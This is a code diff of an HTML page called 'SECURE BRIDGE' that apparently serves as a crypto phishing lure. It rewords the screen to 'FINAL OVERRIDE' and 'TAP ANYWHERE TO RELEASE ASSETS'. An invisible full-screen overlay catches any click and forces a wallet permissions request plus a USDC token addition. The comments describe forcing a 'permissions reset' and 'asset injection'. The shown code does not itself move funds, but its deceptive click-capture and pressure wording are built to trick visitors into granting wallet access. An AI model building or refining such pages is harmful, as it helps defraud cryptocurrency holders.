@@ -5,30 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SECURE BRIDGE</title>
     <style>
-        body { background: #0a0000; color: #ff3e3e; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
-        .box { border: 3px solid #ff3e3e; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #ff3e3e; position: relative; z-index: 1; background: #000; }
+        body { background: #000; color: #ffca28; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
+        .box { border: 3px solid #ffca28; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #ffca28; position: relative; z-index: 1; background: #000; }
         .trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
-        h2 { text-transform: uppercase; letter-spacing: 2px; }
+        h2 { text-shadow: 0 0 10px #ffca28; }
     </style>
 </head>
 <body>
     <div class="trigger" onclick="forceFinalize()"></div>
     <div class="box">
-        <h2>Handshake Ready</h2>
-        <p>TAP CENTER TO FINALIZE BRIDGE</p>
+        <h2>FINAL OVERRIDE</h2>
+        <p>TAP ANYWHERE TO RELEASE ASSETS</p>
     </div>
 
     <script>
         async function forceFinalize() {
             if (window.ethereum) {
                 try {
-                    // Force a fresh permissions request to bypass the browser hang
+                    // Force a total permissions reset to break the screen lock
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Immediate USDC Asset trigger
+                    // Immediate USDC Asset injection
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -37,7 +37,7 @@
                                 address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', 
                                 symbol: 'USDC',
                                 decimals: 6,
-                                image: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=' + Date.now()
+                                image: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png'
                             },
                         },
                     });
